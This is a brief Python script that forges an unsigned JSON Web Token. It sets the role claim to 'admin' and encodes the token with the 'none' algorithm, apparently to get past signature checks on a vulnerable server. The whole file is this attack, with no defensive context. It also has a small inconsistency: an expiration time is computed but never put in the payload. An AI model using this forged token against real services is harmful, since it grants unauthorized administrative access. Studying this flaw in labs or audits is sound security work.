import jwt
import datetime

# Calculate the expiration time (current time + 1 hour)
expiration_time = datetime.datetime.now() + datetime.timedelta(hours=1)

# Define the payload with the dynamic expiration time

payload = {
    "id": 2,
    "email": "user.userson@example.com",
    "firstName": "Bozidar",
    "lastName": "Userson",
    "role": "admin"
    }

# Encode the JWT with the 'None' algorithm
encoded_jwt = jwt.encode(payload, key=None, algorithm='none')

print(f"Encoded JWT (None algorithm): {encoded_jwt}")